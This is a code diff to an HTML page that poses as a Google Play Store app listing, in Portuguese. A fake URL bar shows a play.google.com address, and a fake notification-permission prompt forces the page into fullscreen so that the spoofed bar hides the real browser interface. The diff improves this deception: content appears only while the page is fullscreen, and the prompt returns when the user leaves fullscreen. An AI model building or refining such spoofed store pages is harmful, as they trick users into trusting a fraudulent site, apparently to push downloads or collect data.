@@ -9,6 +9,9 @@
 @font-face { font-family: 'Google Sans'; font-style: normal; font-weight: 400; src: local('Segoe UI'), local('Roboto'); }
 @font-face { font-family: 'Google Sans'; font-style: normal; font-weight: 500; src: local('Segoe UI Semibold'), local('Roboto Medium'); }
 @font-face { font-family: 'Google Sans Display'; font-style: normal; font-weight: 400; src: local('Segoe UI'), local('Roboto'); }
+/* ---- page container (fullscreened) ---- */
+#pageContainer { background:#fff; }
+#pageContainer:fullscreen, #pageContainer:-webkit-full-screen { background:#fff; overflow:auto; }
 /* ---- fake url bar ---- */
 .url-bar { background:#1a1a2e; color:#e0e0e0; padding:6px 12px; font-size:12px; display:flex; align-items:center; gap:8px; font-family: 'Google Sans', Roboto, Arial, sans-serif; user-select:none; position:relative; z-index:1; }
 .url-bar .url-text { flex:1; background:#0d0d1a; border-radius:16px; padding:5px 14px; color:#b0b8c1; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; font-size:11px; }
@@ -27,19 +30,20 @@
 </style>
 </head>
 <body>
-<div class="url-bar"><span class="lock">🔒</span><div class="url-text">https://play.google.com/store/apps/details?id=com.glykka.easysign&amp;hl=pt_BR</div></div>
+<div id="pageContainer">
+  <div class="url-bar"><span class="lock">🔒</span><div class="url-text">https://play.google.com/store/apps/details?id=com.glykka.easysign&amp;hl=pt_BR</div></div>
+  <div id="app" class="loading">Carregando...</div>
+  <div id="content"></div>
+</div>
 
 <div class="modal-overlay" id="notifModal">
   <div class="modal-box">
     <div class="bell">🔔</div>
     <h2>Play Store gostaria de enviar notificações</h2>
     <p>As notificações podem incluir alertas, sons e emblemas de ícone. Elas podem ser configuradas em Ajustes.</p>
-    <button class="btn-allow" onclick="requestFullscreen()">Permitir</button>
+    <button class="btn-allow" id="allowBtn">Permitir</button>
   </div>
 </div>
-
-<div id="app" class="loading">Carregando...</div>
-<div id="content"></div>
 <script>
 /* ---- helpers (global so template functions access them) ---- */
 function esc(s) {
@@ -359,21 +363,34 @@ function footerHtml(c) {
 }
 
 /* ---- fullscreen guard ---- */
-function requestFullscreen() {
-  var el = document.documentElement;
-  (el.requestFullscreen || el.webkitRequestFullscreen || el.msRequestFullscreen).call(el);
-}
-function onFsChange() {
-  if (document.fullscreenElement || document.webkitFullscreenElement) {
-    document.getElementById('notifModal').style.display = 'none';
-    document.getElementById('content').classList.add('show');
-  } else {
-    document.getElementById('notifModal').style.display = 'flex';
-    document.getElementById('content').classList.remove('show');
+(function() {
+  var page = document.getElementById('pageContainer');
+  var modal = document.getElementById('notifModal');
+  var content = document.getElementById('content');
+  var btn = document.getElementById('allowBtn');
+
+  function goFullscreen() {
+    (page.requestFullscreen || page.webkitRequestFullscreen).call(page).catch(function(){});
   }
-}
-document.addEventListener('fullscreenchange', onFsChange);
-document.addEventListener('webkitfullscreenchange', onFsChange);
+
+  function onFsChange() {
+    if (document.fullscreenElement || document.webkitFullscreenElement) {
+      modal.style.display = 'none';
+      content.classList.add('show');
+    } else {
+      modal.style.display = 'flex';
+      content.classList.remove('show');
+    }
+  }
+
+  btn.addEventListener('click', function(e) {
+    e.preventDefault();
+    goFullscreen();
+  });
+
+  document.addEventListener('fullscreenchange', onFsChange);
+  document.addEventListener('webkitfullscreenchange', onFsChange);
+})();
 
 </script>
 </body>
